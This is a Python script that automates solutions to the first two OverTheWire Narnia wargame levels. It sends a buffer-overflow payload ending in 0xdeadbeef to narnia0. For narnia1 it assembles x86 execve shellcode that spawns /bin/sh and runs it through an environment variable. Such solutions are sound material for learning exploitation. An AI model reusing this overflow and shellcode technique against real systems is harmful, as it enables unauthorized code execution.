"""Solver and level solutions for OTW Narnia levels.
"""
import textwrap

from otw import solver


class NarniaSolver(solver.OtwSolver):
  def __init__(self):
    super(NarniaSolver, self).__init__('narnia')

  def get_level_solution(self, level_num):
    return globals()['narnia%d' % level_num]


def narnia0(proc):
  proc.sendline('/narnia/narnia0')
  proc.expect(r'chance: ')
  proc.sendline("a" * 20 + "".join(map(chr, [0xef, 0xbe, 0xad, 0xde])))


def narnia1(proc):
  shellcode = textwrap.dedent('''
      xor eax, eax
      push eax
      push 0x68732f2f
      push 0x6e69622f
      mov ebx, esp
      push eax
      push ebx
      mov ecx, esp
      xor edx, edx
      mov al, 0xb
      int 0x80
  ''').strip()
  shellcode_cmd = 'echo \'%s\' | rasm2 -a x86 -b 32 -B -' % shellcode
  proc.sendline('EGG="$(%s)" /narnia/narnia1' % shellcode_cmd)
